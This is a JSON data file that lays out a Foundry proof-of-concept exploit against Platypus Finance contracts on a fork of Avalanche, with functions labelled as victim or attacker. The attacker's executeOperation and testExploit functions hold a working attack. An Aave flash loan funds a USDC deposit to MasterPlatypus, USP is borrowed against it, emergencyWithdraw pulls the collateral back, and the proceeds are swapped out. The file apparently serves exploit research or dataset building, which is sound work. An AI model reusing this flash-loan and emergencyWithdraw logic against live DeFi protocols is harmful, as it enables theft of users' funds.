[
  {
    "contract/interface": "MasterPlatypusV4",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MasterPlatypusV4",
    "source_type": "victim_contract",
    "function_name": "emergencyWithdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external returns (bool) {\n        USDC.approve(address(aaveV3), amount + premium);\n        USDC.approve(address(Pool), amount);\n        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC\n        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));\n        LPUSDC.approve(address(Master), LPUSDCAmount);\n        Master.deposit(4, LPUSDCAmount); // deposit LP-USDC to MasterPlatypus\n        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));\n        uint256 borrowAmount = Position.borrowLimitUSP;\n        Treasure.borrow(address(LPUSDC), borrowAmount); // borrow USP from Treasure\n        Master.emergencyWithdraw(4);\n        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));\n        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); // withdraw USDC from LP-USDC\n        swapUSPToOtherToken();\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 26_343_613);\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(USP), \"USP\");\n        cheats.label(address(USDC_E), \"USDC_E\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(USDT_E), \"USDT_E\");\n        cheats.label(address(BUSD), \"BUSD\");\n        cheats.label(address(DAI_E), \"DAI_E\");\n        cheats.label(address(LPUSDC), \"LPUSDC\");\n        cheats.label(address(Pool), \"Pool\");\n        cheats.label(address(Master), \"Master\");\n        cheats.label(address(Treasure), \"Treasure\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        aaveV3.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, new bytes(0), 0);\n\n        emit log_named_decimal_uint(\"Attacker USP balance after exploit\", USP.balanceOf(address(this)), USP.decimals());\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker USDC_E balance after exploit\", USDC_E.balanceOf(address(this)), USDC_E.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker USDT_E balance after exploit\", USDT_E.balanceOf(address(this)), USDT_E.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after exploit\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker DAI_E balance after exploit\", DAI_E.balanceOf(address(this)), DAI_E.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PlatypusPool",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PlatypusPool",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PlatypusTreasure",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PlatypusTreasure",
    "source_type": "victim_contract",
    "function_name": "positionView",
    "original_code": "",
    "description": ""
  }
]